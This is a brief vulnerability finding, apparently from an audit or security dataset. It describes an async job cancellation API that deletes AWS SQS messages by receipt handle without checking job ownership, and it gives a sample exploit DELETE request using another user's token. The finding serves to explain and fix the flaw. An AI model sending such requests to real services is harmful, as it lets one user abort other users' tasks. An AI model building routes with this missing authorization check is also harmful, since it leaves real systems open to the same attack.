diagnosis: The asynchronous job cancellation route deletes an in-flight message from an AWS SQS queue using receiptHandle directly from the route parameter without validating job ownership against the authenticated user. An attacker who intercepts or predicts a message handle can delete and abort background compute tasks initiated by other users.
exploit_request:
DELETE /api/async-jobs/queue/AQEBrxX...receiptHandle...== HTTP/1.1
Host: tasks.cloud.internal:3007
Authorization: Bearer <unauthorized_user_token>
Accept: application/json
